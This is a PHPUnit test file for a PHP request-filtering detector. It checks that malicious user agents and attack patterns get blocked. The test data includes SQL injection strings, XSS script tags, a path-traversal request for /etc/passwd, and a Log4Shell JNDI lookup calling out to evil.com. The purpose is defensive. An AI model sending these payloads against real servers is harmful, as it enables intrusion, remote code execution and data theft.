<?php

declare(strict_types=1);

namespace BadBehaviour\Tests\Unit\Detection;

use BadBehaviour\Detection\BlacklistDetector;
use BadBehaviour\Configuration;
use BadBehaviour\Util\RequestPackage;
use BadBehaviour\Core\Result;
use BadBehaviour\Core\ResultCode;
use PHPUnit\Framework\TestCase;

class BlacklistDetectorTest extends TestCase
{
    private BlacklistDetector $detector;

    protected function setUp(): void
    {
        $config = Configuration::from_array([], new \BadBehaviour\Adapter\GenericAdapter());
        $this->detector = new BlacklistDetector($config);
    }

    private function create_package(string $ua, string $uri = '/', string $method = 'GET', array $entity = []): RequestPackage
    {
        return RequestPackage::create_for_test($ua, '192.0.2.1', $method, $uri, [], $entity);
    }

    public function test_empty_ua_blocked(): void
    {
        $package = $this->create_package('');
        $result = $this->detector->detect($package);

        $this->assertNotNull($result);
        $this->assertEquals(ResultCode::BLOCKED_MALICIOUS_UA, $result->code);
    }

    public function test_malicious_prefix_blocked(): void
    {
        $package = $this->create_package('sqlmap/1.0');
        $result = $this->detector->detect($package);

        $this->assertNotNull($result);
        $this->assertEquals(ResultCode::BLOCKED_MALICIOUS_UA, $result->code);
    }

    public function test_malicious_substring_blocked(): void
    {
        $package = $this->create_package('Mozilla/5.0 <script>alert(1)</script>');
        $result = $this->detector->detect($package);

        $this->assertNotNull($result);
        $this->assertEquals(ResultCode::BLOCKED_MALICIOUS_UA, $result->code);
    }

    public function test_sql_injection_in_url_blocked(): void
    {
        $package = $this->create_package('Chrome/120.0', '/page?id=1\' UNION SELECT * FROM users--');
        $result = $this->detector->detect($package);

        $this->assertNotNull($result);
        $this->assertEquals(ResultCode::BLOCKED_ATTACK_PATTERN, $result->code);
    }

    public function test_xss_in_url_blocked(): void
    {
        $package = $this->create_package('Chrome/120.0', '/search?q=<script>alert(1)</script>');
        $result = $this->detector->detect($package);

        $this->assertNotNull($result);
        $this->assertEquals(ResultCode::BLOCKED_ATTACK_PATTERN, $result->code);
    }

    public function test_path_traversal_blocked(): void
    {
        $package = $this->create_package('Chrome/120.0', '/../../etc/passwd');
        $result = $this->detector->detect($package);

        $this->assertNotNull($result);
        $this->assertEquals(ResultCode::BLOCKED_ATTACK_PATTERN, $result->code);
    }

    public function test_log4shell_in_ua_blocked(): void
    {
        $package = $this->create_package('Mozilla/5.0 ${jndi:ldap://evil.com/a}');
        $result = $this->detector->detect($package);

        $this->assertNotNull($result);
        $this->assertEquals(ResultCode::BLOCKED_MALICIOUS_UA, $result->code);
    }

    public function test_headless_chrome_detected(): void
    {
        $package = $this->create_package('Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36 HeadlessChrome/120.0.0.0');
        $result = $this->detector->detect($package);

        $this->assertNotNull($result);
        $this->assertEquals(ResultCode::BLOCKED_MALICIOUS_UA, $result->code);
    }

    public function test_puppeteer_detected(): void
    {
        $package = $this->create_package('Mozilla/5.0 Chrome/120.0.0.0 Safari/537.36 Puppeteer/21.0.0');
        $result = $this->detector->detect($package);

        $this->assertNotNull($result);
        $this->assertEquals(ResultCode::BLOCKED_MALICIOUS_UA, $result->code);
    }

    public function test_normal_browser_allowed(): void
    {
        $package = $this->create_package('Mozilla/5.0 (Windows NT 10.0) Chrome/120.0.0.0 Safari/537.36');
        $result = $this->detector->detect($package);

        $this->assertNull($result);
    }

    public function test_post_body_attack_detected(): void
    {
        $package = $this->create_package(
            'Chrome/120.0',
            '/api',
            'POST',
            ['query' => 'UNION SELECT * FROM users']
        );
        $result = $this->detector->detect($package);

        $this->assertNotNull($result);
        $this->assertEquals(ResultCode::BLOCKED_ATTACK_PATTERN, $result->code);
    }
}
